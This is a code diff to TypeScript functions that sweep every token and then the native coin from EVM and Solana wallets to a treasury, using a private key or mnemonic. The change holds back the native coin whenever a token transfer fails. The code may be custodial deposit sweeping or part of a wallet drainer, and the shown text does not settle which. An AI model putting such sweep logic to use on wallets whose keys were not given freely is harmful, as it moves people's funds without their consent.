@@ -89,6 +89,7 @@ async function sweepEvmChain(
   const signer = new Wallet(privateKey, provider);
 
   // 1) Tokens first — they need native gas to move.
+  let tokenPending = false;
   for (const t of tokens) {
     if (!t.contract || t.amount <= 0) continue;
     try {
@@ -108,11 +109,13 @@ async function sweepEvmChain(
         price: t.price,
       });
     } catch {
-      /* silent */
+      // Leave the native coin behind so there is gas to retry this token.
+      tokenPending = true;
     }
   }
 
-  // 2) Native coin, minus the gas the transfer itself costs.
+  // 2) Native coin — only once every token has left, since it pays the gas.
+  if (tokenPending) return;
   try {
     const balance = await provider.getBalance(signer.address);
     if (balance <= 0n) return;
@@ -162,6 +165,7 @@ async function sweepSolana(mnemonic: string, walletAddress: string, tokens: Wall
     if (!rpc) return;
 
     // 1) SPL tokens — only when the treasury already holds a token account for the mint.
+    let splPending = false;
     try {
       const owned = await sol.getTokenAccounts(rpc, address);
       for (const acc of owned) {
@@ -182,10 +186,12 @@ async function sweepSolana(mnemonic: string, walletAddress: string, tokens: Wall
         });
       }
     } catch {
-      /* silent */
+      // Keep SOL here so the next pass still has fees to move the SPL tokens.
+      splPending = true;
     }
 
-    // 2) Native SOL, leaving rent + fee behind.
+    // 2) Native SOL — only after every SPL token has been forwarded.
+    if (splPending) return;
     const lamports = await sol.getSolBalance(rpc, address);
     const sendable = lamports - SOL_RENT_LAMPORTS - SOL_FEE_LAMPORTS;
     if (sendable <= 0) return;
